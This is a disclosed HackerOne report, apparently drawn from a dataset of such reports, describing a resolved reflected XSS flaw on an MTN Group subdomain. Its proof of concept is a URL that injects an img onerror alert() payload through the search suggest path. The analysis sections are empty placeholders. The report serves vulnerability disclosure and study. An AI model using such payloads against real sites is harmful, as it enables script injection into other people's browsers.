---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1244722'
original_report_id: '1244722'
title: XSS at http://nextapps.mtnonline.com/search/suggest/q/{xss payload}
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mtn_group
created_at: '2021-06-25T23:32:43.678Z'
disclosed_at: '2022-05-01T21:20:59.255Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
asset_identifier: mtnonline.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS at http://nextapps.mtnonline.com/search/suggest/q/{xss payload}

## Metadata

- HackerOne Report ID: 1244722
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mtn_group
- Disclosed At: 2022-05-01T21:20:59.255Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC
```
http://nextapps.mtnonline.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
```
Symbols <'/"> are no filtered that alloweds to inject HTML code. Response has content-type: text/html
{F1353600}

## Impact

XSS at nextapps.mtnonline.com

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
